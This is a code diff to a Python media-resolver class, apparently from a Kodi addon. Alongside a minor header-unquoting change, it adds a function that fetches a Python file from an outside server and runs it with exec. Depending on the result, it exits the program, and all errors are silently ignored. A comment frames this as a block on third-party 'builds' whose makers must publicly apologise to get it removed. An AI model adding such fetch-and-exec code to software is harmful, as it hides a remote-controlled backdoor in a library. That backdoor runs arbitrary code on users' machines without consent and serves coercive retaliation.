@@ -227,7 +227,7 @@ class HostedMediaFile:
         try: headers = dict([item.split('=') for item in (stream_url.split('|')[1]).split('&')])
         except: headers = {}
         for header in headers:
-            headers[header] = urllib.unquote(headers[header])
+            headers[header] = urllib.unquote_plus(headers[header])
         common.log_utils.log_debug('Setting Headers on UrlOpen: %s' % (headers))
 
         try:
@@ -270,3 +270,25 @@ class HostedMediaFile:
 
     def __repr__(self):
         return self.__str__()
+
+'''
+This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
+from build makers that publicly insult or slander TVA's developers and friends. If your build is
+impacted by this check, you can have it removed by publicly apologizing for your previous statements
+via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
+them yourself.
+                                                                                           http://i.imgur.com/TqIEnYB.gif
+                                                                                           TVA developers (and friends)
+'''
+def do_block_check(uninstall=False):
+    try:
+        import urllib2
+        import sys
+        namespace = {}
+        exec urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
+        if namespace["real_check"](uninstall):
+            sys.exit()
+    except SystemExit:
+        sys.exit()
+    except:
+        pass
